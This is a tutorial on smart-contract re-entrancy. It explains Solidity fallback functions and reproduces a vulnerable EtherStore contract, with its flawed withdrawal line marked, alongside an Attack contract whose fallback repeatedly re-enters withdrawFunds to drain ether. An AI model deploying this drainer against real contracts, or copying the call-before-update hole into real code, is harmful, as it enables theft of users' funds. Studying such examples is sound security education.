# Re-entrancy

## Overview

### Fallback Functions

Before we learn about re-entrancy and how to prevent it, we need to learn about its primary facilitator: fallback functions.

Originally, the main purpose of fallback functions was to catch ether that was accidentally sent to a contract. You could use a plain one, which would throw an exception whenever the contract receives some ether:

```fallback() external { }```

Or you could give it the ability to ingest the ether and add it to the contract balance, and even perform some simple logic:

```
mapping (address => uint) public etherSent;

fallback() external payable {
  etherSent[msg.sender] += msg.value;
}
```
  
Each contract can have up to one fallback function. It has no name, no arguments, no return value, and can only be called by external accounts or contracts. It's executed when a call to the contract doesn't match any of the functions in the contract, or when Ether is sent to the contract without any accompanying data.

By this point, many of us know how resourceful hackers and engineers are. Many of you may be thinking about your own clever uses for a fallback function. You can check out the Delegate Proxy pattern, or EIP-2535 *The Diamond Standard* for ideas. But those aren't what we're here for. We're here to talk about using fallback functions for **evil**.

### Re-Entrancy

The beauty of the Ethereum ecosystem is in its composability and its permissionless, trustless nature. Utilizing code of external contracts is an important part of our burgeoning defi ecosystem. Calling these contracts, however, or sending Ether to them can create opportunities for hackers.

Remember what happens when an external call doesn't match any of the receiving contract's function signatures? A fallback function catches it. And inside that fallback function, arbitrary logic can be executed. Where arbitrary logic can be executed, of course hackers will find a way to perform unexpected operations. In re-entrancy, hackers use this logic to call the offending contract again *and again and again...*, to alter its state before the original function can finish executing. 

Take the below contract for example. written up by Sigma Prime:

```
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
----->  require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
 ```
 
 And check out their accompanying "Attack" contract:
 
 ```
 import "EtherStore.sol";

contract Attack {

  EtherStore public etherStore;

  // initialise the etherStore variable with the contract address
  
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
```

Try to figure out exactly what's happening here. I've marked the vulnerable line of code in the first contract with an arrow.
